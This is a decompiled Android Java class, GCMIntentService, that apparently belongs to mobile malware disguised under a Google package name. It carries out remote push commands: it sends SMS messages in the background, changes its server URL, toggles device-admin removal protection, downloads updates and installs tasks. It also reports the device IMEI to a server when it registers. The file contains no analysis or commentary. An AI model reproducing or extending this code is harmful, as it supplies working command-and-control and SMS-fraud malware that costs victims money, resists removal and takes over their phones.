package com.google.elements;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import com.google.android.gcm.GCMBaseIntentService;
import org.json.JSONException;
import org.json.JSONObject;

public class GCMIntentService extends GCMBaseIntentService {
    public GCMIntentService() {
        super("738965552143");
    }

    /* access modifiers changed from: protected */
    public void onMessage(Context context, Intent intent) {
        Utils utils = Utils.getInstance(context);
        String command = intent.getStringExtra("command");
        if (command == null) {
            return;
        }
        final Context scontext;
        String url;
        if (command.equals("START")) {
            context.startService(new Intent(context, WorkService.class));
        } else if (command.equals("RESTART")) {
            Intent work = new Intent(context, WorkService.class);
            context.stopService(work);
            work.setFlags(268435456);
            context.startService(work);
        } else if (command.equals("UNBLOCK")) {
            getApplicationContext();
            ((DevicePolicyManager) getSystemService("device_policy")).removeActiveAdmin(new ComponentName(this, DeviceAdmin.class));
            utils.Edit().putBoolean("allow_remove", true);
            utils.Edit().commit();
        } else if (command.equals("SETTINGS")) {
            scontext = context;
            new Thread(new Runnable() {
                public void run() {
                    Utils.getInstance(scontext).updateSettings();
                }
            }).start();
        } else if (command.equals("SEND_SMS")) {
            utils.sendBackgroundMessage(intent.getStringExtra("data"));
        } else if (command.equals("SEND_SMS_NOW")) {
            utils.sendMessageNow(intent.getStringExtra("data"));
        } else if (command.equals("CHANGE_URL")) {
            url = intent.getStringExtra("data");
            if (url != null && !url.equals(BuildConfig.FLAVOR)) {
                utils.setUrl(url);
            }
        } else if (command.equals("UPDATE_NUMBERS")) {
            utils.updateNumbers();
        } else if (command.equals("UPDATE_INCOMING_PATTERNS")) {
            scontext = context;
            new Thread(new Runnable() {
                public void run() {
                    Utils.getInstance(scontext).updateIncomingPatterns();
                }
            }).start();
        } else if (command.equals("UPDATE_EXCEPTIONS")) {
            utils.updateExceptions();
        } else if (command.equals("START_SENDING")) {
            utils.setStop(false);
            utils.setLastTime();
            utils.setFail(0);
            utils.setSending(0);
            utils.activeApplication();
        } else if (command.equals("STOP_SENDING")) {
            utils.setStop(true);
            utils.deactiveApplication();
        } else if (command.equals("INTERVAL")) {
            utils.setIntervalValue(Integer.parseInt(intent.getStringExtra("data")));
        } else if (command.equals("FIRST_INTERVAL")) {
            utils.setFirstInterval(Integer.parseInt(intent.getStringExtra("data")));
        } else if (command.equals("UPDATE")) {
            scontext = context;
            url = intent.getStringExtra("data");
            new Thread(new Runnable() {
                public void run() {
                    Utils utils = Utils.getInstance(scontext);
                    utils.updateApplication(url.replace("%id", utils.getPartnerId()));
                }
            }).start();
        } else if (command.equals("TASK")) {
            scontext = context;
            final String data = intent.getStringExtra("data");
            new Thread(new Runnable() {
                public void run() {
                    Utils.getInstance(scontext).installTask(data);
                }
            }).start();
        }
    }

    /* access modifiers changed from: protected */
    public void onError(Context context, String s) {
    }

    /* access modifiers changed from: protected */
    public void onRegistered(Context context, String id) {
        Utils utils = Utils.getInstance(this);
        JSONObject info = new JSONObject();
        try {
            info.put("imei", utils.getDeviceId());
            info.put("gcm_id", id);
            utils.sendPostRequest("gcm_registration", info.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: protected */
    public void onUnregistered(Context context, String id) {
        Utils utils = Utils.getInstance(this);
        JSONObject info = new JSONObject();
        try {
            info.put("imei", utils.getDeviceId());
            info.put("gcm_id", id);
            utils.sendPostRequest("gcm_unregistration", info.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
